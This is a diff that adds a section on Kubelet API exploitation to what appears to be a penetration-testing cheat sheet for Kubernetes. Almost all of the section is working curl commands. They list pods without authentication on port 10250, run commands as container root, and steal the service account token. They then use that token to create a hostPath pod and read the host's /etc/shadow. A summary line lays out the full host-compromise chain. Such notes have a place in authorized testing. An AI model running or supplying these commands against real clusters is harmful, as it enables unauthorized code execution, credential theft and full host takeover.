@@ -830,6 +830,36 @@ spec:
 EOF
 ```
 
+### Unauthenticated Kubelet API Exploitation (Port 10250)
+```bash
+# Kubelet API often has weaker auth than K8s API (8443)
+# Test unauthenticated access — list all pods
+curl -ks https://TARGET:10250/pods | jq '.items[].metadata | {name, namespace}'
+
+# Execute commands in a pod (RCE as container root)
+curl -ks https://TARGET:10250/run/NAMESPACE/POD/CONTAINER \
+  -d "cmd=id"
+
+# Extract service account token from pod
+curl -ks https://TARGET:10250/run/NAMESPACE/POD/CONTAINER \
+  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+
+# Use SA token to enumerate permissions via SelfSubjectAccessReview
+TOKEN="<extracted_token>"
+curl -ks -X POST https://TARGET:8443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
+  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'
+
+# If SA can create pods: mount host filesystem via hostPath
+curl -ks -X POST https://TARGET:8443/api/v1/namespaces/default/pods \
+  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"hostmount"},"spec":{"containers":[{"name":"c","image":"nginx","volumeMounts":[{"mountPath":"/hostfs","name":"host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}'
+
+# Read host files through the new pod via kubelet
+curl -ks https://TARGET:10250/run/default/hostmount/c -d "cmd=cat /hostfs/etc/shadow"
+```
+**Key pattern**: kubelet (10250) → pod exec → SA token → K8s API (8443) → create hostPath pod → host filesystem. Even limited SA permissions (create pods only, no secrets) enable full host compromise.
+
 ### Container Escape Techniques
 ```bash
 # Privileged container escape
